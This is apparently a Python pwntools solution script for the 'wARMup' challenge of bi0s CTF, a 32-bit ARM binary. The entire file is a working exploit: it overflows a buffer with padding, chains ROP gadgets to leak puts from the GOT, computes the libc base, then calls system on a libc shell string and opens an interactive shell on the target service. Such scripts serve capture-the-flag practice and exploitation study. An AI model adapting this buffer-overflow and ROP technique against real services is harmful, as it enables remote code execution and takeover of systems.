from pwn import *


def p32(hex):
    from struct import pack
    return pack('<' + 'I' * len(hex), *hex)


context.arch = 'arm'
context.bits = 32
if True:
    # context.log_level = "debug"
    io = remote("localhost", 1337)
else:
    context.log_level = "debug"
    context.terminal = ['tmux', 'splitw', '-h']
    env = {'LD_PRELOAD': './libc-2.24.so'}
    io = gdb.debug('./wARMup', '''
    b * 0x000104d8
    ''', env=env)


payload = "A"*100
payload += p32([0x21e00,
                0x0001052c])

io.recvuntil("Welcome to bi0s CTF!")
io.send(payload)

# 0x00010594: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
# 0x000105ac: pop {r4, r5, r6, r7, r8, sb, sl, pc};
# 0x00010364: pop {r3, pc}

puts = 0x00010528
puts_got = 0x21014

payload = p32([0x21d98,
               0x00010364,
               0x00010364,
               0x000105ac,
               0x0,      # r4
               0x0,      # r5
               0x0,      # r6
               puts_got,  # r7
               0x0,      # r8
               0x0,      # sb
               0x0,      # sl
               0x00010594,  # pc
               0x0,
               puts,
               ])

payload = payload.ljust(100, "\x00")
payload += p32([0x21d9c,
                0x00010548])
io.send(payload)
io.recvline()

libc_leak = u32(io.recv(4))
libc = libc_leak - 0x0005d550
system = libc + 0x00037154
shell = libc + 0x0011d588

log.info("Libc Leak : " + hex(libc_leak))
# log.info("System @ " + hex(system))
payload = p32([0x21d98,
               0x00010364,
               0x00010364,
               0x000105ac,
               0x0,      # r4
               0x0,      # r5
               0x0,      # r6
               shell,  # r7
               0x0,      # r8
               0x0,      # sb
               0x0,      # sl
               0x00010594,  # pc
               0x0,
               system,
               ])
payload = payload.ljust(100, "\x00")
payload += p32([0x21d34,
                0x104d4])
io.send(payload)

io.interactive()
